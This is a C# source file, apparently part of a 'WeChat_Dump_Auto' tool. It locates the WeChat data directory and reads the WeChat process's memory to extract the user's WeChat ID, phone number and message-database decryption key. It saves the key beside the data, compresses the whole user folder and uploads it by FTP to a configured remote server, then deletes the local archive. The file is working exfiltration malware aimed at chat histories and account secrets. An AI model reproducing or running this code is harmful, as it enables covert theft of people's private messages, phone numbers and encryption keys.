﻿using FolderCompressionUtility;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using WeChat_Dump_Auto;

class MemoryScanner
{
    [DllImport("kernel32.dll")]
    private static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll")]
    private static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, out int lpNumberOfBytesRead);

    [DllImport("kernel32.dll")]
    private static extern bool CloseHandle(IntPtr hObject);

    private const uint PROCESS_VM_READ = 0x0010;
    private const uint PROCESS_QUERY_INFORMATION = 0x0400;

    static byte[] GetWechatUserNameBytes(string wxid, string filePath)
    {
        byte[] wxidBytes = System.Text.Encoding.UTF8.GetBytes(wxid);

        byte[] fileBytes = System.IO.File.ReadAllBytes(filePath);

        int index = FindByteArray(fileBytes, wxidBytes);
        if (index != -1)
        {
            byte[] rearBytes = fileBytes.Skip(index + wxidBytes.Length + 6).ToArray();

            int index_1a = Array.IndexOf(rearBytes, (byte)0x1A);
            if (index_1a != -1)
            {
                rearBytes = rearBytes.Take(index_1a).ToArray();
            }

            Console.WriteLine("微信用户名：" + System.Text.Encoding.UTF8.GetString(rearBytes));

    

            // 将字节数组转换为十六进制字符串
            string hexString = BitConverter.ToString(rearBytes).Replace("-", "");

            // 输出十六进制字符串
            Console.WriteLine("微信用户名（十六进制）：" + hexString);
            return rearBytes;
        }
        else
        {
            Console.WriteLine("未找到指定字符串");
            return null;
        }
    }

    static int FindByteArray(byte[] source, byte[] pattern)
    {
        int patternLength = pattern.Length;
        int totalLength = source.Length - patternLength + 1;

        for (int i = 0; i < totalLength; i++)
        {
            if (source.Skip(i).Take(patternLength).SequenceEqual(pattern))
            {
                return i;
            }
        }
        return -1;
    }
    public static string GetHex(IntPtr hProcess, IntPtr lpBaseAddress)
    {
        byte[] array = new byte[8];
        if (!ReadProcessMemory(hProcess, lpBaseAddress, array, array.Length, out int bytesRead))
        {
            return "1";
        }

        ulong baseAddress2 = BitConverter.ToUInt64(array, 0);

        const int num = 32;
        byte[] array2 = new byte[num];
        if (!ReadProcessMemory(hProcess, (IntPtr)baseAddress2, array2, array2.Length, out bytesRead))
        {
            int error = Marshal.GetLastWin32Error();
            return $"2; Error Code: {error}";
        }

        return BytesToHex(array2);
    }

    private static string BytesToHex(byte[] bytes)
    {
        StringBuilder hex = new StringBuilder(bytes.Length * 2);
        foreach (byte b in bytes)
        {
            hex.AppendFormat("{0:X2}", b);
        }
        return hex.ToString();
    }


    public static string GetFolderPath()
    {
        string folderPath = null;
        string username = Environment.GetEnvironmentVariable("USERNAME");
        if (string.IsNullOrEmpty(username))
        {
            Console.WriteLine("无法获取用户名");
        }

        string ConfigPath = Path.Combine("C:\\Users", username, "AppData", "Roaming", "Tencent", "WeChat", "All Users", "config", "3ebffe94.ini");

        try
        {
            // 尝试读取配置文件
            if (File.Exists(ConfigPath))
            {
                string fileContent = File.ReadAllText(ConfigPath, Encoding.UTF8).Trim();

                if (fileContent.Equals("MyDocument:", StringComparison.OrdinalIgnoreCase))
                {
                    folderPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "WeChat Files");
                }
                else
                {
                    folderPath = Path.Combine(fileContent, "WeChat Files");
                }
            }
            else
            {
                Console.WriteLine($"无法打开文件 {ConfigPath}, 尝试从注册表读取");

                // 如果文件不存在，尝试从注册表读取
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Tencent\WeChat"))
                {
                    if (key != null)
                    {
                        folderPath = key.GetValue("FileSavePath") as string;

                        if (string.IsNullOrEmpty(folderPath))
                        {
                            Console.WriteLine("无法读取注册表项中的 FileSavePath");
                            return null;
                        }
                    }
                    else
                    {
                        Console.WriteLine("无法打开注册表项");
                        return null;
                    }
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"发生错误: {ex.Message}");
            return null;
        }

        return folderPath;
    }
    static int Progress = 0;
    public static async Task Main(string[] args)
    {
        string path = GetFolderPath();
        if (Directory.Exists(path))
        {
            //Console.WriteLine($"在路径 '{path}' 下查找包含 'Msg' 子文件夹的所有文件夹:");

            // 获取所有子文件夹
            string[] subdirectories = Directory.GetDirectories(path, "*", SearchOption.AllDirectories);

            // 检查每个子文件夹是否包含名为 'Msg' 的子子文件夹
            foreach (string subdirectory in subdirectories)
            {
                string msgFolderPath = Path.Combine(subdirectory, "Msg");
                if (Directory.Exists(msgFolderPath))
                {
                    string folderName = Path.GetFileName(subdirectory); // 只获取文件夹名称
                    //Console.WriteLine($"找到文件夹: {folderName}");
                    byte[] UserNameBytes = GetWechatUserNameBytes(folderName, subdirectory + "\\config\\AccInfo.dat");
                    string keytext = Run(UserNameBytes);
                    if (keytext != "")
                    {
                        File.WriteAllText(Path.Combine(subdirectory, "Key.txt"), keytext);


                        try
                        {
                            string zipfilename = GetTempZipPath();
                            Console.WriteLine($"{zipfilename}");
                            // 压缩文件夹，不包括根目录，压缩等级为5
                            Console.WriteLine();
                            Console.OutputEncoding = System.Text.Encoding.Unicode;

                            Console.WriteLine("====================================================Zip==================================================");
                            // 创建进度报告对象
                            Progress<double> progres = new Progress<double>(progressa =>
                            {
                                int progress = (int)progressa;
                                char finish = '█';
                                char unfinished = '⑄';
                                string flags = "-\\|/";
                                int totalBlocks = 100;
                                int filledBlocks = (progress * totalBlocks) / 100;

                                string progressStr = new string(finish, filledBlocks).PadRight(totalBlocks, unfinished);
                                string flag = progress == 100 ? "OK" : flags[(Progress % 4)].ToString();
                                double roundedNumber = Math.Round(progressa, 3);
                                string percent = progress == 100 ? "100%" : roundedNumber + "%";

                                Console.Write($"\r[{flag}][{progressStr}][{percent}]");

                                if (progress >= 100)
                                {
                                    Console.WriteLine(); // 完成时换行
                                }
                                Progress += 1;
                            });

                            try
                            {
                                await FolderCompressor.CompressFolderAsync(
                                    subdirectory,
                                    zipfilename,
                                    compressionLevel: Config.compressionLevel,
                                    includeBaseDirectory: true,
                                    excludeFileStorageFiles: true,
                                    progress: progres
                                );

                                Console.WriteLine($"压缩完成！ZIP文件位于: {zipfilename}");
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine($"压缩过程中发生错误: {ex.Message}");
                            }
                            FTPHelper.UploadFileWithProgress(Config.ftpurl, zipfilename, Config.ftp_username,Config.ftp_password);
                            File.Delete(zipfilename);
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"压缩失败: {ex.Message}");
                        }
                    }
                    
                }
            }
        }
        else
        {
            Console.WriteLine($"指定路径 '{path}' 不存在。");
        }
    }




    /// <summary>
    /// 生成一个临时的ZIP文件路径。
    /// </summary>
    /// <returns>临时ZIP文件的完整路径。</returns>
    public static string GetTempZipPath()
    {
        string tempPath = Path.GetTempPath(); // 获取临时文件夹路径
        string fileName = Path.GetRandomFileName(); // 生成随机文件名
        string tempZipPath = Path.Combine(tempPath, $"{Path.GetFileNameWithoutExtension(fileName)}.zip"); // 组合成ZIP文件路径
        return tempZipPath;
    }
    private static string Run(byte[] UserNameBytes)
    {
        string returnstring = "";
        //Console.WriteLine("UserNameBytes in hex: " + BitConverter.ToString(UserNameBytes));

        // 查找WeChat.exe进程
        Process process = Process.GetProcessesByName("WeChat").FirstOrDefault();
        if (process == null)
        {
            returnstring += "未找到WeChat进程\n";
            return returnstring;
        }

        // 打开进程
        IntPtr processHandle = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, false, process.Id);
        if (processHandle == IntPtr.Zero)
        {
            returnstring += "无法打开进程\n";
        }

        // 查找WeChatWin.dll模块
        ProcessModule weChatWinModule = process.Modules.Cast<ProcessModule>().FirstOrDefault(m => m.ModuleName == "WeChatWin.dll");
        if (weChatWinModule == null)
        {
            CloseHandle(processHandle);
            returnstring += "未找到WeChatWin.dll模块\n";
        }

        IntPtr moduleBaseAddress = weChatWinModule.BaseAddress;
        int moduleSize = weChatWinModule.ModuleMemorySize;

        byte[] buffer = new byte[moduleSize];
        if (ReadProcessMemory(processHandle, moduleBaseAddress, buffer, buffer.Length, out int bytesRead))
        {
            int matchIndex = FindPattern(buffer, UserNameBytes);
            if (matchIndex != -1)
            {
                IntPtr userNameAddress = moduleBaseAddress + matchIndex;
                returnstring += $"找到匹配字节，用户名地址: WeChatWin.dll+0x{matchIndex:X}\n";

                // 根据已知的偏移量关系计算其他字段的地址
                int weChatIDOffset = 1336; // 微信ID相对于用户名的偏移量
                int phoneNumberOffset = -192; // 手机号相对于用户名的偏移量
                int keyOffset = 1272; // Key相对于用户名的偏移量

                // 获取微信ID地址
                IntPtr weChatIDAddress = moduleBaseAddress + (matchIndex + weChatIDOffset);
                //Console.WriteLine($"微信ID地址: WeChatWin.dll+0x{(matchIndex + weChatIDOffset):X}");

                // 获取手机号地址
                IntPtr phoneNumberAddress = moduleBaseAddress + (matchIndex + phoneNumberOffset);
                //Console.WriteLine($"手机号地址: WeChatWin.dll+0x{(matchIndex + phoneNumberOffset):X}");

                // 获取Key地址
                IntPtr keyAddress = moduleBaseAddress + (matchIndex + keyOffset);
                //Console.WriteLine($"Key地址: WeChatWin.dll+0x{(matchIndex + keyOffset):X}");

                // 读取微信ID
                byte[] weChatIDBuffer = new byte[32];
                if (ReadProcessMemory(processHandle, weChatIDAddress, weChatIDBuffer, weChatIDBuffer.Length, out bytesRead))
                {
                    int nullIndex = Array.IndexOf(weChatIDBuffer, (byte)0);
                    string weChatID = System.Text.Encoding.UTF8.GetString(weChatIDBuffer, 0, nullIndex >= 0 ? nullIndex : weChatIDBuffer.Length);
                    returnstring += "微信ID (文本): " + weChatID + "\n";
                }
                else
                {
                    returnstring += "无法读取微信ID";
                }

                // 读取手机号
                byte[] phoneNumberBuffer = new byte[32];
                if (ReadProcessMemory(processHandle, phoneNumberAddress, phoneNumberBuffer, phoneNumberBuffer.Length, out bytesRead))
                {
                    int nullIndex = Array.IndexOf(phoneNumberBuffer, (byte)0);
                    string phoneNumber = System.Text.Encoding.UTF8.GetString(phoneNumberBuffer, 0, nullIndex >= 0 ? nullIndex : phoneNumberBuffer.Length);
                    returnstring += "手机号 (文本): " + phoneNumber+"\n";
                }
                else
                {
                    returnstring += "无法读取手机号\n";
                }

                string key = GetHex(processHandle, keyAddress);
                returnstring += "Key (十六进制): " + key+"\n";
                return returnstring;
            }
            else
            {
                returnstring = "";
                return returnstring;
            }
        }

        CloseHandle(processHandle);
        return returnstring;
    }
    private static int FindPattern(byte[] buffer, byte[] pattern)
    {
        for (int i = 0; i < buffer.Length - pattern.Length; i++)
        {
            bool found = true;
            for (int j = 0; j < pattern.Length; j++)
            {
                if (buffer[i + j] != pattern[j])
                {
                    found = false;
                    break;
                }
            }
            if (found)
            {
                return i;
            }
        }
        return -1;
    }
}
